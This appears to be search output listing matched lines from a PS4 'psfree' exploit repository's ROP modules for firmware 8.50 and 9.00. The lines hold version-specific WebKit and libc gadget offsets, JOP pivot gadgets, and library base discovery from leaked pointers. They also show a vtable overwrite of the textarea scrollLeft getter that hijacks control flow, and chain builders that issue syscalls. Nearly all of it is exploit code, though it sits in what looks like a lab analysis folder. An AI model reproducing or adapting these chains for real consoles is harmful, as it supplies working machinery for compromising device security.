+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:230:        gadget_map.set(insn, base_addr.add(offset));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:243:        rw.write64(this.jmp_target, 0x1d, this.get_gadget(jop4));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:244:        rw.write64(this.jmp_target, 0, this.get_gadget(jop5));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:255:        this.push_gadget(rop_epilogue);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:291:    //     chain.push_gadget('mov rax, 0; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:293:    //     chain.push_gadget('pop rbx; ret'); // always executed
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:304:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:306:        this.push_gadget('neg rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:307:        this.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:309:        this.push_gadget('adc esi, esi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:310:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:312:        this.push_gadget('mov qword ptr [rdi], rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:320:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:322:        this.push_gadget('mov rax, qword ptr [rax]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:325:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:329:        this.push_gadget('neg rax; and rax, rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:330:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:332:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:342:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:346:        this.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:353:        this.push_gadget('add rcx, rsi; and rdx, rcx; or rax, rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:354:        this.push_gadget('mov rdx, rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:359:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:361:        this.push_gadget('mov rax, qword ptr [rax]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:367:        this.push_gadget('add rax, rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:372:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:374:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:379:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:381:        this.push_gadget('mov rdx, rax; xor eax, eax; shl rdx, cl; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:386:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:388:        this.push_gadget('pop rdi; jmp qword ptr [rax + 0x1d]');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:410:        this.push_call(this.get_gadget('setjmp'), this.jmp_buf_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:421:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:425:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:427:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:430:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:431:        this.push_value(this.get_gadget('ret'));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:432:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:434:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:436:        this.push_call(this.get_gadget('longjmp'), this.jmp_buf_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:449:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:451:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:465:    syscall(...args) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:467:            throw Error('syscall() needs an empty chain');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:469:        this.push_syscall(...args);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:487:        // Only offset 0x1c8 will be used when calling the scrollLeft getter
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:500:        // 0x1c8 is the offset of the scrollLeft getter native function
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:501:        rw.write64(vtable, 0x1c8, this.get_gadget(ta_jop1));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:502:        rw.write64(vtable, 0xb8, this.get_gadget(ta_jop2));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:503:        rw.write64(vtable, 0x60, this.get_gadget(ta_jop3));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:510:        //rw.write64(rax_ptrs, 8, this.get_gadget(jop2));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:511:        rw.write64(rax_ptrs, 0x68, this.get_gadget(jop2));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:512:        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop3));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:513:        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:514:        rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:518:        const jop_buffer = new Uint8Array(8);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:519:        const jop_buffer_p = get_view_vector(jop_buffer);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:520:        this.jop_buffer = jop_buffer;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:522:        rw.write64(jop_buffer, 0, rax_ptrs_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:524:        rw.write64(vtable, 8, jop_buffer_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:543:    [libwebkit_base, libkernel_base, libc_base] = get_bases();
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:545:    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:546:    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:547:    init_syscall_array(syscall_array, libkernel_base, 300 * KB);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:548:    debug_log('syscall_array:');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:549:    debug_log(syscall_array);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:550:    Chain.init_class(gadgets, syscall_array);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:553:function test_rop(Chain) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:559:    setjmp_addr = gadgets.get('setjmp');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:560:    longjmp_addr = gadgets.get('longjmp');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:565:    chain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:593:    chain.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:596:    chain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:602:    chain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:604:    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:610:    chain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:612:    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:625:    chain.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:628:    chain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:634:    chain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:636:    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:642:    chain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:644:    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:653:    debug_log('test syscall getuid()');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:655:    // Set the return value to some random value. If the syscall worked, then
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:660:    chain.syscall('getuid');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:664:        die('syscall getuid failed');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/850.mjs:669:test_rop(Chain);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:30:    find_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:32:    resolve_import,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:33:    init_syscall_array,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:37:import * as o from './module/offset.mjs';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:43:const syscall_array = [];
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:45:const offset_func_exec = 0x18;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:46:const offset_textarea_impl = 0x18;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:47:const offset_js_inline_prop = 0x10;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:49:// WebKit offsets of imported functions
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:50:const offset_wk_stack_chk_fail = 0x178;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:51:const offset_wk_memcpy = 0x188;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:53:// libSceLibcInternal offsets
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:54:const offset_libc_setjmp = 0x24F04;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:55:const offset_libc_longjmp = 0x29448;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:71:let libwebkit_base = null;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:72:// libkernel_web.sprx
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:73:let libkernel_base = null;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:77:// Chain implementation based on Chain803. Replaced offsets that changed
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:78:// between versions. Replaced gadgets that were missing with new ones that
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:81:// gadgets for the JOP chain
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:83:// Why these JOP chain gadgets are not named jop1-3 and jop2-5 not jop4-7 is
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:84:// because jop1-5 was the original chain used by the old implementation of
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:85:// Chain803. Now the sequence is ta_jop1-3 then to jop2-5.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:89:const ta_jop1 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:97:// ta_jop1 pushed another object (via the call instruction) but we want no
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:99:// jop2 later. So we pop the return address pushed by ta_jop1.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:102:const ta_jop2 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:106:const ta_jop3 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:113:const jop2 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:119:const jop3 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:124:const jop4 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:128:const jop5 = 'pop rsp; ret';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:142:const rop_epilogue = 'leave; ret';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:144:const webkit_gadget_offsets = new Map(Object.entries({
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:181:    [jop2] : 0x0000000000683800,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:182:    [jop3] : 0x0000000000303906,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:183:    [jop4] : 0x00000000028bd332,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:184:    [jop5] : 0x000000000004e293,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:186:    [ta_jop1] : 0x00000000004e62a4,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:187:    [ta_jop2] : 0x00000000021fce7e,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:188:    [ta_jop3] : 0x00000000019becb4,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:191:const libc_gadget_offsets = new Map(Object.entries({
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:195:    'setjmp' : offset_libc_setjmp,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:196:    'longjmp' : offset_libc_longjmp,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:199:const gadgets = new Map();
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:203:    const webcore_textarea = mem.addrof(textarea).readp(offset_textarea_impl);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:205:    const libwebkit_base = find_base(textarea_vtable, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:208:        libwebkit_base
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:209:        .add(offset_wk_stack_chk_fail)
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:211:    const stack_chk_fail_addr = resolve_import(
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:216:    const libkernel_base = find_base(stack_chk_fail_addr, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:218:    const memcpy_import = libwebkit_base.add(offset_wk_memcpy);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:219:    const memcpy_addr = resolve_import(memcpy_import, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:220:    const libc_base = find_base(memcpy_addr, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:223:        libwebkit_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:224:        libkernel_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:229:function init_gadget_map(gadget_map, offset_map, base_addr) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:230:    for (const [insn, offset] of offset_map) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:231:        gadget_map.set(insn, base_addr.add(offset));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:244:        rw.write64(this.jmp_target, 0x1c, this.get_gadget(jop4));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:245:        rw.write64(this.jmp_target, 0, this.get_gadget(jop5));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:256:        this.push_gadget(rop_epilogue);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:292:    //     chain.push_gadget('mov rax, 0; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:294:    //     chain.push_gadget('pop rbx; ret'); // always executed
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:305:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:307:        this.push_gadget('neg rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:308:        this.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:310:        this.push_gadget('adc esi, esi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:311:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:313:        this.push_gadget('mov qword ptr [rdi], rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:321:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:323:        this.push_gadget('mov rax, qword ptr [rax]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:326:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:330:        this.push_gadget('neg rax; and rax, rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:331:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:333:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:343:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:347:        this.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:354:        this.push_gadget('add rcx, rsi; and rdx, rcx; or rax, rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:355:        this.push_gadget('mov rdx, rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:360:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:362:        this.push_gadget('mov rax, qword ptr [rax]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:368:        this.push_gadget('add rax, rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:373:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:375:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:380:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:382:        this.push_gadget('mov rdx, rax; xor eax, eax; shl rdx, cl; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:387:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:389:        this.push_gadget('pop rsi; jmp qword ptr [rax + 0x1c]');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:411:        this.push_call(this.get_gadget('setjmp'), this.jmp_buf_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:422:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:426:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:428:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:431:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:432:        this.push_value(this.get_gadget('ret'));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:433:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:435:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:437:        this.push_call(this.get_gadget('longjmp'), this.jmp_buf_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:450:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:452:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:466:    syscall(...args) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:468:            throw Error('syscall() needs an empty chain');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:470:        this.push_syscall(...args);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:488:        // Only offset 0x1c8 will be used when calling the scrollLeft getter
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:501:        // 0x1b8 is the offset of the scrollLeft getter native function
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:502:        rw.write64(vtable, 0x1b8, this.get_gadget(ta_jop1));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:503:        rw.write64(vtable, 0xb8, this.get_gadget(ta_jop2));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:504:        rw.write64(vtable, 0x1c, this.get_gadget(ta_jop3));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:511:        //rw.write64(rax_ptrs, 8, this.get_gadget(jop2));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:512:        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop2));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:513:        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop3));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:514:        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:515:        rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:519:        const jop_buffer = new Uint8Array(8);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:520:        const jop_buffer_p = get_view_vector(jop_buffer);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:521:        this.jop_buffer = jop_buffer;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:523:        rw.write64(jop_buffer, 0, rax_ptrs_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:525:        rw.write64(vtable, 8, jop_buffer_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:544:    [libwebkit_base, libkernel_base, libc_base] = get_bases();
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:546:    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:547:    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
